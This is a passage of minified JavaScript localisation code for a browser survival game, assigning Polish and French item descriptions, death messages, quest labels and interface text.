        ve[le.HAMMER_AMETHYST] = ["Ametystowy młot", "Pomocny w niszczeniu budowli", "Obrażenia: 5", "Obrażenia do budowli: 50"];
        ve[le.SUPER_HAMMER] = ["Super młot", "Miałeś kiedyś plan zniszczenia świata?", "Obrażenia: 12", "Obrażenia do budowli: 70"];
        ve[le.WOOD_SPEAR] = ["Drewniana włócznia", "Jak patyk, ale kłuje.", "Obrażenia: 10", "Obrażenia do budowli: 2"];
        ve[le.SPEAR] = ["Kamienna włócznia", "Początek ewolucji!", "Obrażenia: 14", "Obrażenia do budowli: 4"];
        ve[le.GOLD_SPEAR] = ["Złota włócznia", "Uważaj, kłuje!", "Obrażenia: 15", "Obrażenia do budowli: 5"];
        ve[le.DIAMOND_SPEAR] = ["Diamentowa włócznia", "Jesteś gotowy, aby zabić smoka", "Obrażenia: 17", "Obrażenia do budowli: 5"];
        ve[le.AMETHYST_SPEAR] = ["Ametystowa włócznia", "Smoki już nie są dla ciebie zagrożeniem", "Obrażenia: 18", "Obrażenia do budowli: 6"];
        ve[le.SHOVEL] = ["Kamienna łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 2"];
        ve[le.SHOVEL_GOLD] = ["Złota łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 3", "Obrażenia do budowli: 1"];
        ve[le.SHOVEL_DIAMOND] = ["Diamentowa łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 4", "Obrażenia do budowli: 1"];
        ve[le.SHOVEL_AMETHYST] = ["Ametystowa łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 5", "Obrażenia do budowli: 1"];
        ve[le.WOOD_HELMET] = ["Drewniany hełm", "Lepsze niż nic", "Obrona przed graczami: 1", "Obrona przed zwierzętami: 4"];
        ve[le.STONE_HELMET] = ["Kamienny hełm", "Jesteś gotowy do bitwy!", "Obrona przed graczami: 2", "Obrona przed zwierzętami: 8"];
        ve[le.GOLD_HELMET] = ["Złoty hełm", "Zwany także hełmem barbarzyńców", "Obrona przed graczami: 4", "Obrona przed zwierzętami: 13"];
        ve[le.DIAMOND_HELMET] = ["Diamentowy hełm", "Nie przechwalaj się za bardzo", "Obrona przed graczami: 5", "Obrona przed zwierzętami: 19"];
        ve[le.AMETHYST_HELMET] = ["Ametystowy hełm", "Nie boisz się już niczego", "Obrona przed graczami: 6", "Obrona przed zwierzętami: 23"];
        ve[le.DRAGON_HELMET] = ["Smoczy hełm", "Zmierzysz się z całym światem", "Obrona przed graczami: 8", "Obrona przed zwierzętami: 27"];
        ve[le.EXPLORER_HAT] = ["Czapka odkrywcy", "Zwierzęta nie będą zwracały na ciebie uwagi", "ale nie rób hałasu!", "Ciepło w i poza zimą"];
        ve[le.CHRISTMAS_HAT] = ["świąteczna czapka", "Oh, oh, oh, Wesołych Świąt", "Ciepło w i poza zimą"];
        ve[le.ELF_HAT] = ["Czapka elfa", "Nie pozwól się być wykorzystywanym, mały śnieżny elfie!", "Ciepło w i poza zimą"];
        ve[le.HOOD] = ["Kaptur", "Jesteś łobuzem", "Możesz coś komuś ukraść jeśli", "- Jest noc", "- Nic przy sobie nie masz", "- Jeżeli nic przez chwilę nie dotykałeś", "- Nie jesteś blisko ognia", "- Twój cel nie jest ubrany w chłopską tunikę", "Jest ciepło w i poza zimą"];
        ve[le.EARMUFFS] = ["Nauszniki", "Jakiś inny rodzaj małej czapki.", "Ciepło w i poza zimą"];
        ve[le.COAT] = ["Czapka", "Także nazywana płaszczem.", "Ciepła w i poza zimą"];
        ve[le.CAP_SCARF] = ["Szal i czapka", "Bardzo wygodna, bardzo ciepła"];
        ve[le.PEASANT] = ["Chłopska tunika", "Twoje rośliny rosną szybciej", "Ciepła w i poza zimą"];
        ve[le.WINTER_HOOD] = ["Zimowy kaptur", "Możesz coś komuś ukraść jeśli", "- Jest noc", "- Nic przy sobie nie masz", "- Jeżeli nic przez chwilę nie dotykałeś", "- Nie jesteś blisko ognia", "- Twój cel nie jest ubrany w tunikę zimowego chłopa", "Jest ciepło w i poza zimą"];
        ve[le.WINTER_PEASANT] = ["Zimowa chłopska tunika", "Twoje rośliny rosną szybciej", "Ciepło w i poza zimą"];
        ve[le.DIVING_MASK] = ["Maska do nurkowania", "Jesteś szybki w wodzie", "Ciepło", "Obrona przed graczami: 2, Obrona przed zwierzętami: 8"];
        ve[le.SUPER_DIVING_SUIT] = ["Strój głębinowy", "Jesteś bardzo szybki w wodzie", "Ciepło ci w wodzie", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"];
        ve[le.DRAGON_ORB] = ["Smocza kula", "Zdobyta podczas zadania"];
        ve[le.DRAGON_HEART] = ["Smocze serce", "Zamienia cię w ducha po śmierci!", "Jesteś duchem na 60 sekund", "Znajdź kamień rezurekcyjny"];
        ve[le.GEMME_GREEN] = ["Zielony kryształ", "Nie oszukiwałeś, przysięgasz?"];
        ve[le.GEMME_ORANGE] = ["Pomarańczowy kryształ", "Tylko prawdziwy pirat może go znaleźć!"];
        ve[le.GEMME_BLUE] = ["Niebieski kryształ", "Dla zbyt miłych ludzi"];
        ve[le.CROWN_GREEN] = ["Zielona korona", "Szybko się leczysz", "Uzdrawia z biegiem czasu: 40", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"];
        ve[le.CROWN_ORANGE] = ["Pomarańczowa korona", "Nagle poczułeś smak szczęścia", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"];
        ve[le.CROWN_BLUE] = ["Niebieska korona", "Gdy już będziesz martwy, zamienisz się w ducha", "Przy okazji stracisz swoją broń i kilof", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"];
        ve[le.BUCKET_FULL] = ["Wiadro", "Również przydatne do napełnienia studni", "Jedno wiadro jest jak dwanaście butelek"];
        ve[le.BUCKET_EMPTY] = ["Puste wiadro", "Musisz napełnić to wiadro wodą"];
        ve[le.BOTTLE_FULL] = ["Butelka", "Pozwala pić wodę wszędzie", "Woda: 50"];
        ve[le.BOTTLE_EMPTY] = ["Pusta butelka", "Możesz napełnić tą butelkę blisko źródła wody"];
        ve[le.WATERING_CAN] = ["Pusta konewka", "Musisz ją napełnić w źródle wody, aby ją użyć"];
        ve[le.WATERING_CAN_FULL] = ["Konewka", "Pozwala podlewać rośliny", "Obrażenia: 1"];
        ve[le.BAG] = ["Plecak", "Więcej miejsca na twoje przedmioty!"];
        ve[le.PAPER] = ["Papier", "Używany w tworzeniu książki"];
        ve[le.BOOK] = ["Książka", "Pozwala znacznie skrócić wytwarzanie", "Musisz ją nosić by zadziałała", "Uszkodzenie 1"];
        ve[le.BANDAGE] = ["Bandaż", "Szybciej zregeneruj życie", "Uzdrawia z biegiem czasu: 30", "Efekt: 5"];
        ve[le.LOCK] = ["Zamek", "Pozwala ci zamknąć skrzynię"];
        ve[le.LOCKPICK] = ["Wytrych", "Pozwala ci odblokować jedną skrzynię"];
        ve[le.TOTEM] = ["Totem", "Pozwala ci stworzyć drużynę", "Dziel się drzwiami i zamkniętymi skrzyniami", "Szkodliwe budynki nie zranią twoich przyjaciół"];
        ve[le.BRIDGE] = ["Most", "Bardzo przydatny w wodzie", "Pozwala ci pić bez utonięcia", "Chodzisz szybciej w wodzie"];
        ve[le.SIGN] = ["Tabliczka", "Zostaw wiadomość dla innych", "Wytrzymałość: 200"];
        ve[le.ROOF] = ["Dach", "Trochę cie ogrzewa i chowa!"];
        ve[le.WELL] = ["Studnia", "Umożliwia napełnienie butelki", "Wytrzymałość: 1000"];
        ve[le.WALL] = ["Drewniany mur", "Znasz taniec ścian?", "Wytrzymałość: 1000"];
        ve[le.STONE_WALL] = ["Kamienny mur", "Jest to trochę bardziej poważniejsze.", "Wytrzymałość: 1500"];
        ve[le.GOLD_WALL] = [" Złoty mur", "Złoto na twoich murach? To trochę krzykliwe.", "Wytrzymałość: 2000"];
        ve[le.DIAMOND_WALL] = ["Diamentowy mur", "Jaki błyszczący, uważaj na oczy", "Wytrzymałość: 2500"];
        ve[le.AMETHYST_WALL] = ["Ametystowy mur", "Musisz bardzo się bać, aby wyjść!", "Wytrzymałość: 3000"];
        ve[le.SPIKE] = ["Drewniany kolczasty mur", "Może uszkodzić wrogów", "Obrażenia: 10, Obrażenia po uszkodzeniu: 2", "Wytrzymałość: 150"];
        ve[le.STONE_SPIKE] = ["Kamienny kolczasty mur", "Nie chciałbym być twoim wrogiem.", "Obrażenia: 20", " Obrażenia po uszkodzeniu: 3", "Wytrzymałość: 300"];
        ve[le.GOLD_SPIKE] = ["Złoty kolczasty mur", "Jesteśtaki okrutny.", "Obrażenia: 30", " Obrażenia po uszkodzeniu: 3", "Wytrzymałość: 600"];
        ve[le.DIAMOND_SPIKE] = ["Diamentowy kolczasty mur", "Raczej nie lubisz towarzystwa.", "Obrażenia: 40", "Obrażenia po uszkodzeniu: 4", "Wytrzymałość: 1200"];
        ve[le.AMETHYST_SPIKE] = ["Ametystowy kolczasty mur", "Co ci sąsiedzi ci zrobili?", "Obrażenia: 50", "Obrażenia po uszkodzeniu: 4", "Wytrzymałość: 2400"];
        ve[le.WOOD_DOOR] = ["Drewniane drzwi", "Może być otwarte przez ciebie lub przyjaciół", "Wytrzymałość: 1000"];
        ve[le.STONE_DOOR] = ["Kamienne drzwi", "Solidne drzwi są bardziej poważne ", "Wytrzymałość: 1500"];
        ve[le.GOLD_DOOR] = ["Złote drzwi", "Czy odbudowujesz El Dorado?", "Wytrzymałość: 2000"];
        ve[le.DIAMOND_DOOR] = ["Diamentowe drzwi", "Dla błyszczącego domu", "Wytrzymałość: 2500"];
        ve[le.AMETHYST_DOOR] = ["Ametystowe drzwi", "Czy twój dom to zamknięty sejf?", "Wytrzymałość: 3000"];
        ve[le.FURNACE] = ["Piec", "Ogrzewa cię", "Zużywa drewno co 5 sekund", "Wytrzymałość: 1000"];
        ve[le.WINDMILL] = ["Młyn", "Może produkować mąkę z pszenicy", "Przygotowanie mąki zajmuje 5 sekund", "Zwraca punkty podczas pracy", "Wytrzymałość: 2000"];
        ve[le.BREAD_OVEN] = ["Piec do chleba", "Pozwala na wypiek chleba z mąki", "Przygotowanie chleba zajmuje 10 sekund", "Zwraca punkty podczas pracy", "Wytrzymałość: 2000"];
        ve[le.RESURRECTION] = ["Kamień rezurekcyjny", "To magia", "Wskrzesi cię jeśli jesteś duchem", "Stracisz swoja broń i kilof", "Wytrzymałość: 200"];
        ve[TEXT.YOU_CANNOT_JOIN] = "Nie możesz dołączyć do tego serwera";
        ve[TEXT.KICKED] = "Wyrzucony: ";
        ve[TEXT.KEY_ALREADY] = "Twój klucz jest aktualnie używany przez innego gracza";
        ve[TEXT.KEY_WRONG] = "Twój klucz jest nieprawidłowy";
        ve[TEXT.OLD_VERSION] = "Posiadasz starszą wersję, musisz wyczyścić swoją pamięć";
        ve[TEXT.NO_MORE_RESOURCES] = "Nie ma nowych minerałów, zwierząt, i jedzenia";
        ve[TEXT.SURVIVED_1DAY] = "Przeżyłeś 1 dzień";
        ve[TEXT.SURVIVED] = "Przeżyłeś ";
        ve[TEXT.DAYS] = " dni";
        ve[TEXT.DEAD_SAD] = "Jesteś martwy ;-;";
        ve[TEXT.SPAM_ME] = "Serwer nie może znaleźć miejsca na spawn! Spamuj przycisk zagraj! Lub wybierz inny serwer...";
        ve[TEXT.SPAM_ME2] = "Serwer jest pełny! Spamuj przycisk zagraj!";
        ve[TEXT.EMPTY] = "Źródło jest puste";
        ve[TEXT.INV_FULL] = "Ekwipunek jest pełny (użyj prawego przycisku myszy, żeby wyrzucić przedmiot)";
        ve[TEXT.DEAD] = " jest martwy";
        ve[TEXT.WRONG_TOOL] = "To nie jest właściwe narzędzie";
        ve[TEXT.JOIN_TEAM] = "Dołączyłeś do drużyny";
        ve[TEXT.YOU_DEAD] = "Jesteś martwy";
        ve[TEXT.JOINED_TEAM] = " dołączył do drużyny";
        ve[TEXT.TEAM_DESTROYED] = "Twoja drużyna została zniszczona";
        ve[TEXT.LEFT_TEAM] = " Opuściłeś drużynę";
        ve[TEXT.LEFT_TEAM2] = " opuścił drużynę";
        ve[TEXT.TOKEN] = "Ktoś ukradł twój żeton :>";
        ve[TEXT.CHOOSE] = "Wybierz serwer";
        ve[TEXT.PLAYERS] = "graczy";
        ve[TEXT.TOTAL_PLAYERS] = "wszystkich graczy";
        ve[TEXT.TOTAL_MODE] = "graczy w tym trybie";
        ve[TEXT.COMMING_SOON] = "Już wkrótce...";
        document.getElementById("nickname_input").placeholder = "Przydomek";
        Le[0] = ["Zostałeś zabity bez powodu"];
        Le[1] = ["Umarłeś z głodu, jak nazwa gry wskazuje"];
        Le[2] = ["Zamarzłeś na śmierć. Ale smutne", "Masz hipotermię. Następnym razem, zamiast tego spróbuj siedzieć obok ogniska."];
        Le[3] = ["Gracz zabił cię, mówiąc ci 'git gud.' ", "Zostałeś zamordowany przez gracza. Nie martw się, ten gracz też zginie, ewentualnie."];
        Le[4] = ["Byłeś za blisko ogniska i spłonąłeś. Zły pomysł.", "Zginąłeś od ognia. Ogień cię rani. Idź i napisz o tym historię."];
        Le[5] = ["Twoje ciało stało się gniazdem dla pajęczych jaj", "Pająk cię zabił. Przynajmniej to nie był królik."];
        Le[6] = ["Wilk już nie będzie głodował po zjedzeniu cię", "To nie są pieski.Wilki nie lubią jak się je głaszcze."];
        Le[7] = ["Lis był dla ciebie za szybki", "Lis zmienił cię w pudło.Od kiedy zwierzęta mają magiczne zdolności?"];
        Le[8] = ["Niedźwiedź chciał się tylko przytulić.", "Niedźwiedź był biedny. Nie jest mi przykro."];
        Le[9] = ["Zostałeś spalony na popiół przez smoka. Jakie to smutne.", "Zostałeś spłaszczony przez smoka. Być zmiażdżonym to okropny sposób na śmierć."];
        Le[10] = ["Wskoczyłeś na kolczasty mur. Niezbyt dobry pomysł...", "Zostałeś zabity przez kolczasty mur. Większość ludzi ludzi jest wystarczająco rozsądna, aby nie dotykać spiczastych rzeczy."];
        Le[11] = ["Nawet duch potrafi umrzeć.", "Nie udało ci się dokonać rezurekcji. To jest gra, więc żyjesz po śmierci, więc..."];
        Le[12] = ["Bakterie z twojego surowego mięsa zabiły cię. Ta gra jest zdecydowanie za trudna.", "Ty zabiłeś surowe mięso. Ono zabiło ciebię."];
        Le[13] = ["Zginąłeś z pragnienia. Lepiej pić własny mocz."];
        Le[14] = ["Czy wiedziałeś, że usta głodomorka są zawsze pod wodą podczas pływania? Teraz wiesz."];
        Le[15] = ["Nie martw się, zasmakowałeś pirani.", "Zabawny fakt: Piranie jedzą ludzi, włączając ciebie."];
        Le[16] = ["LapaMauve nie planuje abyś mógł zabić krakena", "Kraken rozwalił twoją czaszkę."];
        Le[17] = ["Twoja skóra odpada, słońce cię zabija."];
        Le[18] = ["Czosnek w twoich kieszeniach  ugotował ci mózg."];
        Le[19] = ["Jako wampir, nie stałbym blisko ząbków czosnku."];
        Le[20] = ["Zjadłeś czosnek jako wampir, czego oczekiwałeś?"];
        Le[21] = ["Twoje ciało owija się w cierniste krzaki.Kiedy próbujesz uciec,twoja skóra odpada i twoje serce przestaje bić."];
        ZOMBIE_GRUMBLE = "Uuunnnggg";
        ZOMBIE_GRUMBLES = ["Uuunnnggg... Głoduję", "Potrzebuję twojego mózgu Uuunnnggg...", "Świeże mięso tutaj.. Uuunnnggg", "Uuunnnggg... Jesteś pyszny", "Uuunnnggg...", "Jeść... uuunnnggg...", "Czuję krew... Uuunnnggg"];
      }, me = function () {
        ve[le.DRAGON_CUBE] = ["You feel a great power emanating from this orb"];
        Le[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."];
        ve[le.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"];
        ve[TEXT.BACK_TO_THE_GAME] = " RETOUR AU JEU";
        ve[TEXT.TWITTER] = " Partage sur Twitter";
        ve[TEXT.FACEBOOK] = " Partage sur Facebook";
        ve[TEXT.KIT_NEXT] = "Tu peux acheter des objets dans le magasin à ta prochaine partie avec tes points";
        ve[TEXT.POINTS] = "points";
        ve[TEXT.SCORE] = "Score";
        ve[TEXT.KILL] = "Tués";
        ve[TEXT.DAYS_SURVIVED] = "Jours survécus";
        ve[TEXT.MODE_FREE] = "Mode de construction: Libre. Appuie sur G pour changer";
        ve[TEXT.MODE_GRID] = "Mode de construction: Grille. Appuie sur G pour changer";
        ve[le.CRAB_LOOT] = ["Pince de crabe", "Les pinces de crabes peuvent aussi être mangées", "Food: 10"];
        ve[le.CRAB_SPEAR] = ["Lance en crabe", "Te permet de soigner les crabes et de les calmer", "Donne un bonus de +10 degats quand elle est portée", "avec un casque un crabe sur un Crab King", "Damage: 14", "Building Damage: 4"];
        ve[le.CROWN_CRAB] = ["Casque en crabe", "Tu es le Roi des Crabes!", "Les crabes te suivent", "Ils ne peuvent pas te frapper et toi non plus", "Players Defense: 4", "Animals Defense: 13"];
        ve[le.BED] = ["Lit", "Repose-toi dans ce lit douillet", "Tu as moins froid, moins faim et moins soif", "Tu te régénères plus vite", "Durability: 400"];
        document.getElementById("typequest").innerHTML = "Chrono Quêtes";
        document.getElementById("timeremainingquest").innerHTML = "Temps Restant";
        document.getElementById("constraintquest").innerHTML = " Contraintes";
        document.getElementById("claim_rewards").innerHTML = " Résultat";
        document.getElementById("rewardquest").innerHTML = " Récompenses";
        document.getElementById("killdragon_1").innerHTML = " Collecte 1 Cœur de dragon dans la cave";
        document.getElementById("amethyst_2").innerHTML = " Récolte 1 améthyste";
        document.getElementById("survive20min_3").innerHTML = "Survis sans perdre de vie";
        document.getElementById("treasure_chest_4").innerHTML = " Ouvre 5 coffres au trésor";
        document.getElementById("dont_hit_5").innerHTML = " Sois pacifique";
        document.getElementById("bread_6").innerHTML = " Cuisine 100 pains en hiver, seul et sans retour en arrière";
        document.getElementById("winter_7").innerHTML = " Après 1 jour, survis en hiver";
        for (var e = 0; e < 7; e++) {
          document.getElementById("claim_reward_" + e).innerHTML = "RÉCOMPENSE!";
        }
        document.getElementById("quit_chronoquest").innerHTML = " QUITTER";
        ve[le.HAND] = ["Main"];
        ve[le.GROUND] = ["Terre", "C'est sale!"];
        ve[le.SAND] = ["Sable", "J'en ai dans les yeux"];
        ve[le.WOOD] = ["Bois", "Tu n'en auras jamais trop!"];
        ve[le.STONE] = ["Pierre", "Aussi appelée roche"];
        ve[le.GOLD] = ["Or", "Sois généreux, donne en aux autres"];
        ve[le.DIAMOND] = ["Diamant", "Comme tes yeux! wesh"];
        ve[le.AMETHYST] = ["Améthyste", "C'est Mauve comme Lapa"];
        ve[le.FLOUR] = ["Farine", "Utile pour la cuisine"];
        ve[le.COOKIE] = ["Cookie", "Un somptueux cookie de Grand-Mère", "Nourriture: 50"];
        ve[le.CAKE] = ["Gâteau", "Pour les fins gourmets", "Nourriture: 100"];
        ve[le.MEAT] = ["Viande crue", "Tu peux la cuisiner avec du feu", "Intoxication: 10", "Nourriture: 15"];
        ve[le.COOKED_MEAT] = ["Viande cuite", "Un steak saignant, s'il vous plait", "Nourriture: 35"];
        ve[le.FOODFISH] = ["Poisson cru", "Je crois que c'est encore vivant", "Intoxication: 10", "Nourriture: 18"];
        ve[le.FOODFISH_COOKED] = ["Poisson cuit", "Avec du citron, c'est parfait", "Nourriture: 35"];
        ve[le.BREAD] = ["Baguette", "Une tradition s'il vous plait", "C'est la monnaie du marché", "Nourriture: 15"];
        ve[le.SANDWICH] = ["Sandwich", "Le Jambon Beurre vaincra", "Nourriture: 100"];
        ve[le.CANDY] = ["Bonbons", "Il n'y a pas de dentiste ici", "Nourriture: 100"];
        ve[le.SUGAR_CAN] = ["Canne à sucre", "Sans sucre de canne", "Nourriture: 20"];
        ve[le.GARLAND] = ["Guirlandes", "Utilisable sur les toits"];
        ve[le.SEED] = ["Graines de baies", "Deviennent des baies", "Naissance: 2min", "Croissance: 55s", "Arrosage: 3min 20s", "Durabilité: 700", "Durée de vie: 8 jours"];
        ve[le.PLANT] = ["Baies", "Peu nourrissant", "Nourriture: 10"];
        ve[le.WHEAT_SEED] = ["Graines de blé", "Deviennent du blé", "Naissance: 2min", "Croissance: 16s", "Arrosage: 2min", "Durabilité: 700", "Durée de vie: 8 jours"];
        ve[le.WILD_WHEAT] = ["Blé", "Peut être transformé en farine dans les moulins"];
        ve[le.PUMPKIN_SEED] = ["Graines de citrouille", "Deviennent des citrouilles", "Naissance: 2min 40s", "Croissance: 2min", "Arrosage: 2min", "Durabilité: 700", "Durée de vie: 8 jours"];
        ve[le.PUMPKIN] = ["Citrouille", "Ça me rappelle Halloween", "Nourriture: 30"];
        ve[le.GARLIC_SEED] = ["Graines d'ail", "Très dangereux pour les vampires", "Dégâts: 20", "Naissance: 4min", "Croissance: 1min 10s", "Arrosage: 1min 40s", "Durabilité: 700", "Durée de vie: 8 jours"];
        ve[le.GARLIC] = ["Ail", "Soigne et réduit le froid", "Nourriture: 14", "Soigne sur le temps: 30", "Effet: 1 fois"];
        ve[le.THORNBUSH_SEED] = ["Graines de ronces", "Peuvent blesser vos ennemis", "Dégâts: 20", "Naissance: 4min", "Croissance: 15s", "Arrosage: 3min", "Durabilité: 1000", "Durée de vie: 8 jours"];
        ve[le.THORNBUSH] = ["Ronces", "Ça pique!"];
        ve[le.PLOT] = ["Terreau", "Indispensable", "Vos plantes grandiront plus vite", "et auront besoin de moins d'eau", "Durabilité: 2000"];
        ve[le.ICE] = ["Glace", "Pratique pour faire de l'eau et des gâteaux"];
        ve[le.SPANNER] = ["Clé à molette", "Pour réparer les portes, les murs et les piques", "Dégâts: 2"];
        ve[le.FUR_WOLF] = ["Peau de loup", "Il était où le gentil ti Youki?"];
        ve[le.FUR] = ["Peau de lapin", "Vous êtes un monstre"];
        ve[le.SPECIAL_FUR] = ["Fourrure blanche", "Tu es une usine à pain"];
        ve[le.SPECIAL_FUR_2] = ["Fourrure noire", "Tu te sens prêt à faire quelque chose de mal"];
        ve[le.FUR_WINTER] = ["Fourrure d'hiver", "Il voulait juste un calin"];
        ve[le.SCALES] = ["Écailles", "Ça sent le poisson!"];
        ve[le.KRAKEN_SKIN] = ["Peau du kraken", "Tu n'as pas eu trop peur?"];
        ve[le.FIRE] = ["Feu de camp", "Réchauffe", "Durabilité: 150", "Durée de vie: 2min"];
        ve[le.BIG_FIRE] = ["Grand feu de camp", "Réchauffe plus longtemps", "Durabilité: 400", "Durée de vie: 6min"];
        ve[le.WORKBENCH] = ["Établi", "Utile pour fabriquer toute sorte d'objets"];
        ve[le.CORD] = ["Fil", "Utile pour faire des chapeaux et un sac"];
        ve[le.BLUE_CORD] = ["Fil de diamant", "Utile pour faire des chapeaux"];
        ve[le.CHEST] = ["Coffre", "Permet de ranger des objets", "Durabilité: 500"];
        ve[le.SWORD_WOOD] = ["Épée en bois", "C'est pour les enfants", "Dégâts: 12", "Démolition: 4"];
        ve[le.SWORD] = ["Épée en pierre", "Sois gentil avec les autres", "Dégâts: 19", "Démolition: 6"];
        ve[le.SWORD_GOLD] = ["Épée en or", "Roi de la forêt", "Dégâts: 22", "Démolition: 7"];
        ve[le.SWORD_DIAMOND] = ["Épée en diamant", "Tu te sens puissant", "Dégâts: 24", "Démolition: 8"];
        ve[le.PIRATE_SWORD] = ["Épée de pirate", "Marin d'eau douce!", "Meilleure portée qu'une épée normale", "Dégâts: 24", "Démolition: 8"];
        ve[le.SWORD_AMETHYST] = ["Épée en améthyste", "Mauve est la plus belle couleur du monde", "Dégâts: 27", "Démolition: 9"];
        ve[le.DRAGON_SWORD] = ["Épée du Dragon", "Pas de pitié!", "Dégâts: 30", "Démolition: 10"];
        ve[le.DRAGON_SPEAR] = ["Lance du Dragon", "Tuez-les tous!", "Dégâts: 22", "Démolition: 6"];
        ve[le.PICK_WOOD] = ["Pioche en bois", "Peut récolter du bois et de la pierre", "Dégâts: 1"];
        ve[le.PICK] = ["Pioche en pierre", "Peut aussi récolter de l'or", "Dégâts: 2"];
        ve[le.PICK_GOLD] = ["Pioche en or", "Peut aussi récolter du diamant", "Dégâts: 3", "Démolition: 1"];
        ve[le.PICK_DIAMOND] = ["Pioche en diamant", "Peut tout récolter", "Dégâts: 4", "Démolition: 1"];
        ve[le.PICK_AMETHYST] = ["Pioche en améthyste", "Peut tout récolter", "Dégâts: 5", "Démolition: 1"];
        ve[le.HAMMER] = ["Marteau en pierre", "Utile pour détruire les bâtiments", "Ne marche pas bien sur du diamant et améthyste", "Dégâts: 2", "Démolition: 20"];
        ve[le.HAMMER_GOLD] = ["Marteau en or", "Utile pour détruire les bâtiments", "Ne marche pas bien sur l'améthyste", "Dégâts: 3", "Démolition: 30"];
        ve[le.HAMMER_DIAMOND] = ["Marteau en diamant", "Utile pour détruire les bâtiments", "Dégâts: 4", "Démolition: 40"];
        ve[le.HAMMER_AMETHYST] = ["Marteau en améthyste", "Utile pour détruire les bâtiments", "Dégâts: 5", "Démolition: 50"];
        ve[le.SUPER_HAMMER] = ["Super Marteau", "As-tu prévu de détruire le monde?", "Dégâts: 12", "Démolition: 70"];
        ve[le.WOOD_SPEAR] = ["Lance en bois", "Plus de peur que de mal", "Dégâts: 10", "Démolition: 2"];
        ve[le.SPEAR] = ["Lance en pierre", "C'est le début de l'évolution", "Dégâts: 14", "Démolition: 4"];
        ve[le.GOLD_SPEAR] = ["Lance en or", "Attention, ça pique!", "Dégâts: 15", "Buildings Dégâts: 5"];
        ve[le.DIAMOND_SPEAR] = ["Lance en diamant", "Tu es prêt à tuer les dragons", "Dégâts: 17", "Buildings Dégâts: 5"];
        ve[le.AMETHYST_SPEAR] = ["Lance en améthyste", "Les dragons ne te font plus peur", "Dégâts: 18", "Buildings Dégâts: 6"];
        ve[le.SHOVEL] = ["Pelle en pierre", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 2"];
        ve[le.SHOVEL_GOLD] = ["Pelle en or", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 3", "Buildings Dégâts: 1"];
        ve[le.SHOVEL_DIAMOND] = ["Pelle en diamant", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 4", "Buildings Dégâts: 1"];
        ve[le.SHOVEL_AMETHYST] = ["Pelle en améthyste", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 5", "Buildings Dégâts: 1"];
        ve[le.WOOD_HELMET] = ["Casque en bois", "Mieux que rien", "Défense: 1", "Défense contre animaux: 4"];
        ve[le.STONE_HELMET] = ["Casque en pierre", "Prêt pour la bataille", "Défense: 2", "Défense contre animaux: 8"];
        ve[le.GOLD_HELMET] = ["Casque en or", "Alias le casque des sauvages", "Défense: 4", "Défense contre animaux: 13"];
        ve[le.DIAMOND_HELMET] = ["Casque en diamant", "Ne te vante pas trop", "Défense: 5", "Défense contre animaux: 19"];
        ve[le.AMETHYST_HELMET] = ["Casque en améthyste", "Tu n'as plus peur de rien", "Défense: 6", "Défense contre animaux: 23"];
        ve[le.DRAGON_HELMET] = ["Casque du Dragon", "Tu vas conquérir le monde", "Défense: 8", "Défense contre animaux: 27"];
        ve[le.EXPLORER_HAT] = ["Chapeau d'explorateur", "Les animaux t'ignorent", "Mais ne faites pas de bruit!", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.CHRISTMAS_HAT] = ["Chapeau du Père Noël", "Oh, oh, oh, Joyeux Nöel!", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.ELF_HAT] = ["Chapeau du lutin de Nöel", "Tu as vu le nouveau chef d'oeuvre d'Alain Chabat?", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.HOOD] = ["Capuche", "Voyou!", "Tu peux voler seulement si", "1) Il fait nuit", "2) Tu as les mains libres", "3) Tu n'as pas été touché depuis 8 secondes", "4) Tu es loin d'un feu", "5) Ta cible n'est pas un paysan", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.EARMUFFS] = ["Cache-oreilles", "Une sorte de petite chapka.", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.COAT] = ["Chapka", "Comment ça va, camarade?", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.CAP_SCARF] = ["Bonnet d'hiver", "Très confortable", "Très chaud"];
        ve[le.PEASANT] = ["Tunique", "Les plantes poussent plus vite", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.WINTER_HOOD] = ["Capuche d'hiver", "Tu peux voler seulement si", "1) Il fait nuit", "2) Tu as les mains libres", "3) Tu n'as pas été touché depuis 4 secondes", "4) Tu es loin d'un feu", "5) Ta cible n'est pas un paysan d'hiver", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.WINTER_PEASANT] = ["Tunique d'hiver", "Tes plantes poussent plus vite", "Réchauffe en dehors de l'eau et dans l'hiver"];
        ve[le.DIVING_MASK] = ["Masque de plongée", "Tu es rapide dans l'eau", "Réchauffe dans l'eau", "Défense: 2, Défense contre animaux: 8"];
        ve[le.SUPER_DIVING_SUIT] = ["Scaphandre", "Tu es très rapide dans l'eau", "Réchauffe dans l'eau", "Défense: 4, Défense contre animaux: 16"];
        ve[le.DRAGON_ORB] = ["Orbe du Dragon", "Donné en Quête"];
        ve[le.DRAGON_HEART] = ["Coeur de Dragon", "Te change en fantôme!", "Tu es un fantôme pendant 1 min", "Trouve une pierre de résurrection"];
        ve[le.GEMME_GREEN] = ["Gemme verte", "Tu n'as pas triché, promis?"];
        ve[le.GEMME_ORANGE] = ["Gemme orange", "Seul un vrai pirate peut l'obtenir!"];
